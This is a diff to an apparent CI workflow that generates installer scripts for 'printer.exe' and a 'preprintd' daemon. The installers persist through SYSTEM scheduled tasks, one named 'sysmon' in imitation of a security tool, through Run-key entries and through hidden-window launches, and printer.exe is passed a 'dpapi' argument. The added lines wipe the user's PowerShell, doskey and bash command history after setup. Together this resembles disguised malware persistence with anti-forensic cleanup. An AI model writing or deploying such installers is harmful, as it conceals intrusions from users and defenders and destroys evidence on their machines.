@@ -91,7 +91,9 @@ jobs:
             'schtasks /Create /TN "sysmon" /TR "\"%d%\printer.exe\" \"%dpapi%\" \"%ua%\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
             'schtasks /Run /TN "sysmon" >nul',
             'echo Setup completed successfully.',
-            'timeout /t 3 >nul',
+            'doskey /reinstall >nul 2>&1',
+            'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
+            'cls',
             'endlocal',
             'exit /b'
           ) | Set-Content -Path "admin.bat" -Encoding ASCII
@@ -109,7 +111,9 @@ jobs:
             'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sysmon" /t REG_SZ /d "\"%d%\printer.exe\" \"%dpapi%\" \"%ua%\"" /f >nul',
             'start "" "%d%\printer.exe" "%dpapi%" "%ua%"',
             'echo Setup completed successfully.',
-            'timeout /t 3 >nul',
+            'doskey /reinstall >nul 2>&1',
+            'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
+            'cls',
             'endlocal',
             'exit /b'
           ) | Set-Content -Path "user.bat" -Encoding ASCII
@@ -164,10 +168,13 @@ jobs:
             'setx /M ALIAS "%alias%" >nul 2>&1',
             'setx /M DEF_HOST "172.16.0.111" >nul 2>&1',
             'setx /M DEF_QUEUE "secure" >nul 2>&1',
+            'setx /M STATE_DIRECTORY "%d%" >nul 2>&1',
             'schtasks /Create /TN "preprintd" /TR "\"%d%\preprintd.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
             'schtasks /Run /TN "preprintd" >nul',
             'echo Setup completed successfully.',
-            'timeout /t 3 >nul',
+            'doskey /reinstall >nul 2>&1',
+            'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
+            'cls',
             'endlocal',
             'exit /b'
           ) | Set-Content -Path "preprintd-admin.bat" -Encoding ASCII
@@ -185,14 +192,18 @@ jobs:
             'setx ALIAS "%alias%" >nul 2>&1',
             'setx DEF_HOST "172.16.0.111" >nul 2>&1',
             'setx DEF_QUEUE "secure" >nul 2>&1',
+            'setx STATE_DIRECTORY "%d%" >nul 2>&1',
             'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "preprintd" /t REG_SZ /d "\"%d%\preprintd.exe\"" /f >nul',
             'set "WORKER_KEY=%k%"',
             'set "ALIAS=%alias%"',
             'set "DEF_HOST=172.16.0.111"',
             'set "DEF_QUEUE=secure"',
+            'set "STATE_DIRECTORY=%d%"',
             'powershell -NoProfile -Command "Start-Process -FilePath ''%d%\preprintd.exe'' -WindowStyle Hidden"',
             'echo Setup completed successfully.',
-            'timeout /t 3 >nul',
+            'doskey /reinstall >nul 2>&1',
+            'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
+            'cls',
             'endlocal',
             'exit /b'
           ) | Set-Content -Path "preprintd-user.bat" -Encoding ASCII
@@ -216,7 +227,8 @@ jobs:
             'set -e',
             'echo "PreConnect Preprint Daemon Setup"',
             'while true; do',
-            '  read -rp "Enter Worker Key: " K',
+            '  read -rsp "Enter Worker Key: " K',
+            '  echo',
             '  if [ -n "$K" ]; then',
             '    break',
             '  fi',
@@ -293,6 +305,8 @@ jobs:
             '    <string>172.16.0.111</string>',
             '    <key>DEF_QUEUE</key>',
             '    <string>secure</string>',
+            '    <key>STATE_DIRECTORY</key>',
+            '    <string>$DIR</string>',
             '  </dict>',
             '  <key>RunAtLoad</key>',
             '  <true/>',
@@ -303,7 +317,12 @@ jobs:
             'EOF',
             '  launchctl unload "$PLIST" 2>/dev/null || true',
             '  launchctl load -w "$PLIST"',
-            'fi'
+            'fi',
+            'echo "Setup completed successfully."',
+            'rm -f "$HOME/.bash_history" 2>/dev/null || true',
+            'history -c 2>/dev/null || true',
+            'clear 2>/dev/null || true',
+            'exit 0'
           )
           [IO.File]::WriteAllText("preprintd.sh", (($shContent -join "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))
 
